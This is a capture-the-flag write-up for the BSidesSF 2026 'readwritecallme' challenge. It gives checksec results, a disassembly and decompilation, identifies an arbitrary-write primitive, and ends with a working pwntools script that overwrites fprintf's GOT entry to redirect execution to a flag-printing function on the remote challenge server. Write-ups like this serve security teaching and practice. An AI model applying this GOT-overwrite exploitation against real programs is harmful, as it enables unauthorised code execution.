
### Checksec
```BASH
(pwnenv) chill@pop-os:~/vaults/PWN/Ctfs/BSidesSF 2026/readwritecallme$ checksec ./readwritecallme
[*] '/home/chill/vaults/PWN/Ctfs/BSidesSF 2026/readwritecallme/readwritecallme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Based on stack protections with NX enabled we can't execute shell code on the stack. With partial RELRO and nothing else we have a simple binary. 

### Disassembly and Decomp
```
0000000000401528 <secret_function>:
  401528:	55                   	push   %rbp
  401529:	48 89 e5             	mov    %rsp,%rbp
  40152c:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
  401533:	bf 0a 00 00 00       	mov    $0xa,%edi
  401538:	e8 f3 fa ff ff       	call   401030 <putchar@plt>
  40153d:	48 8d 05 0c 0d 00 00 	lea    0xd0c(%rip),%rax        # 402250 <_IO_stdin_used+0x250>
  401544:	48 89 c7             	mov    %rax,%rdi
  401547:	e8 f4 fa ff ff       	call   401040 <puts@plt>
  40154c:	48 8d 05 38 0d 00 00 	lea    0xd38(%rip),%rax        # 40228b <_IO_stdin_used+0x28b>
  401553:	48 89 c6             	mov    %rax,%rsi
  401556:	48 8d 05 30 0d 00 00 	lea    0xd30(%rip),%rax        # 40228d <_IO_stdin_used+0x28d>
  40155d:	48 89 c7             	mov    %rax,%rdi
  401560:	e8 8b fb ff ff       	call   4010f0 <fopen@plt>
  401565:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401569:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  40156e:	74 29                	je     401599 <secret_function+0x71>
  401570:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  401574:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
  40157b:	be 80 00 00 00       	mov    $0x80,%esi
  401580:	48 89 c7             	mov    %rax,%rdi
  401583:	e8 e8 fa ff ff       	call   401070 <fgets@plt>
  401588:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
  40158f:	48 89 c7             	mov    %rax,%rdi
  401592:	e8 a9 fa ff ff       	call   401040 <puts@plt>
  401597:	eb 0f                	jmp    4015a8 <secret_function+0x80>
  401599:	48 8d 05 f8 0c 00 00 	lea    0xcf8(%rip),%rax        # 402298 <_IO_stdin_used+0x298>
  4015a0:	48 89 c7             	mov    %rax,%rdi
  4015a3:	e8 98 fa ff ff       	call   401040 <puts@plt>
  4015a8:	bf 00 00 00 00       	mov    $0x0,%edi
  4015ad:	e8 4e fb ff ff       	call   401100 <exit@plt>
```

```c
00401528    void secret_function() __noreturn

00401528    {
00401528        putchar(0xa);
00401547        puts("I'm not called from anywhere but I'm still very important!");
00401560        FILE* fp = fopen("flag.txt", "r");
00401560        
0040156e        if (!fp)
004015a3            puts("Couldn't find flag file! Please report: flag.txt");
0040156e        else
0040156e        {
00401583            char var_98[0x88];
00401583            fgets(&var_98, 0x80, fp);
00401592            puts(&var_98);
0040156e        }
0040156e        
004015ad        exit(0);
004015ad        /* no return */
00401528    }
```

Looks like it just prints the flag so we want to overwrite something to trigger secret_function.

```c
004011f6    int32_t main(int32_t argc, char** argv, char** envp)

004011f6    {
004011f6        int32_t argc_1 = argc;
00401208        char** argv_1 = argv;
00401228        setvbuf(__TMC_END__, nullptr, 2, 0);
00401246        setvbuf(stderr, nullptr, 2, 0);
00401255        puts("Instructions:");
00401264        puts("* Send 'r' (read), 'h' (read in hex), or 'w' "
00401264        "(write), followed by a newline");
00401273        puts("* Send a 64-bit offset (in hex), followed by a newline");
00401282        puts("* Send a 32-bit length value (in hex), followed by "
00401282        "a newline");
0040128c        putchar(0xa);
0040129b        puts("If reading, exactly (length) bytes will be printed "
0040129b        "(no newline or anything)");
004012aa        puts("If reading hex, exactly (length) bytes will be "
004012aa        "printed as hex (ending up at length*2 size)");
004012b9        puts("If writing, send exactly (length) binary bytes and "
004012b9        "they will be written to the offset");
004012c3        putchar(0xa);
004012d2        puts("Note: this does respect memory protections (ie, "
004012d2        "you can't write to code sections)");
004012dc        putchar(0xa);
004012eb        puts("GO");
004012fa        fflush(__TMC_END__);
00401315        char buf[0x20];
00401315        
00401315        while (fgets(&buf, 0x20, stdin))
00401315        {
00401315            if (buf[0] != 0x72 && buf[0] != 0x77
00401315                    && buf[0] != 0x68)
00401342                break;
00401342            
00401366            char var_178[0x20];
00401366            
00401366            if (!fgets(&var_178, 0x20, stdin))
00401366                break;
00401366            
0040138a            char var_198[0x20];
0040138a            
0040138a            if (!fgets(&var_198, 0x20, stdin))
0040138a                break;
0040138a            
004013a4            int64_t buf_1 = strtoll(&var_178, nullptr, 0x10);
004013c1            int32_t rax_7 = strtol(&var_198, nullptr, 0x10);
004013c1            
004013d1            if (buf[0] == 0x72)
004013f2                write(fileno(__TMC_END__), buf_1, 
004013f2                    (uint64_t)rax_7);
004013d1            else if (buf[0] != 0x68)
00401405            {
0040147e                if (buf[0] != 0x77)
0040147e                    break;
0040147e                
00401484                int32_t var_20_1 = 0;
00401484                
004014fa                while (var_20_1 < rax_7)
004014fa                {
004014fa                    int32_t rax_18 = fread(
004014fa                        (int64_t)var_20_1 + buf_1, 1, 
004014fa                        (uint64_t)(rax_7 - var_20_1), stdin);
004014fa                    
004014c2                    if (!rax_18)
004014c2                    {
004014c9                        exit(0);
004014c9                        /* no return */
004014c2                    }
004014c2                    
004014d1                    var_20_1 += rax_18;
004014f0                    fprintf(stderr, "%d\n", (uint64_t)var_20_1, 
004014f0                        &data_402242);
004014fa                }
00401405            }
00401405            else
00401405            {
0040141a                char var_138[0x10c];
0040141a                memcpy(&var_138, buf_1, (uint64_t)rax_7);
0040141a                
0040145f                for (int32_t i = 0; i < rax_7; i += 1)
0040145f                    fprintf(__TMC_END__, "%02x", 
0040145f                        (uint64_t)var_138[(int64_t)i], "%02x");
0040145f                
0040146b                fflush(__TMC_END__);
00401405            }
00401315        }
00401315        
00401518        puts("Good bye!");
00401527        return 0;
004011f6    }

```

After reading main I noticed we have direct write capabilities. 
```c
int64_t buf_1 = strtoll(&var_178, nullptr, 0x10);

fread((int64_t)var_20_1 + buf_1, 1, ...)
```

Initially tried to overwrite puts@GOT but didn't realize secret_function calls it so I got an infinite loop. 

### Solution & Primitive
```python
from pwn import *

binary = ELF('./readwritecallme')
p = remote('readwritecallme-b32595e6.challenges.bsidessf.net', 4444)

fprintf_got = 0x404030
secret = 0x401528

p.recvuntil(b'GO\n')
p.sendline(b'w')
p.sendline(hex(fprintf_got).encode())
p.sendline(b'8')
p.send(p64(secret))

print(p.recvall(timeout=5))
```

`Flag: CTF{read-and-write-the-memoriesss}`

Primitive: *Arbitrary write to an arbitrary address with attacker controlled length*

